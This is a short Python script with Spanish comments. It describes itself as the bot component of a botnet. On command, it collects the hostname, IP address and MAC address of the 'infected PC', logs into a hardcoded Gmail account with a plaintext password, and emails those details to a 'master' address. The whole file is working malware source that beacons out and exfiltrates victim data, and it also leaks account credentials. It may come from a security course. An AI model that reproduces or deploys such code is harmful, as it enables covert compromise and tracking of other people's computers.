import smtplib
from email.mime.text import MIMEText
import socket
from uuid import getnode as get_mac

#Codigo que se ejecuta en el bot en caso de que se le pida mandar un correo para 
#saber que esta activo. Entra en su cuenta gmail y le manda un correo al master.

#Extraemos info del pc infectado
nombre_equipo = socket.gethostname() #nombre del equipo
direccion_equipo = socket.gethostbyname(nombre_equipo) #direccion ip
mac = '%012X' % get_mac() #direccion MAC
mac_string = ':'.join(mac[i:i+2] for i in range(0, len(mac), 2)) 
#Guardamos en el "asunto" el nombre del equipo y la MAC
asunto="Nombre equipo: "+nombre_equipo+" -- "+"MAC: "+ mac_string 

# Establecemos conexion con el servidor smtp de gmail
mailServer = smtplib.SMTP('smtp.gmail.com',587)
mailServer.ehlo()
mailServer.starttls()
mailServer.ehlo()
mailServer.login("telecobot@gmail.com","seguridadevigo")

# Construimos el mensaje simple
mensaje = MIMEText("""Este es el mensaje""")
mensaje['From']="telecobot@gmail.com"
mensaje['To']="telecofather@gmail.com"
mensaje['Subject']=asunto

# Envio del mensaje
mailServer.sendmail("telecobot@gmail.com", "telecofather@gmail.com", mensaje.as_string())
